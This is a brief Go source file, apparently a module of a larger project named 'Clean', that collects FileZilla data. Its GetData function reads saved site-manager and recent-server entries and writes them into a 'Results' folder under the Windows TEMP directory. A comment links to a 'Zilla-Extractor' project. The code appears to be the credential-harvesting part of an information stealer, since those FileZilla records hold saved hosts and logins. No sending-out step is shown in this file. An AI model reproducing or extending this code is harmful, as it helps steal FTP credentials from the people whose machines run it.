package Zilla

import (
	"os"
	"path/filepath"

	"github.com/equisde/Clean/core/Zilla/data"
	"github.com/equisde/Clean/utils"
)

// https://github.com/equisde/Zilla-Extractor

func GetData() {
	os.Mkdir(tempPath+"\\Zilla", 0777)
	data.SaveBoth(data.GetSiteManagers(), data.GetRecentServers())
}

var (
	tempPath = utils.CleanPath(filepath.Join(os.Getenv("TEMP"), "Results"))
)
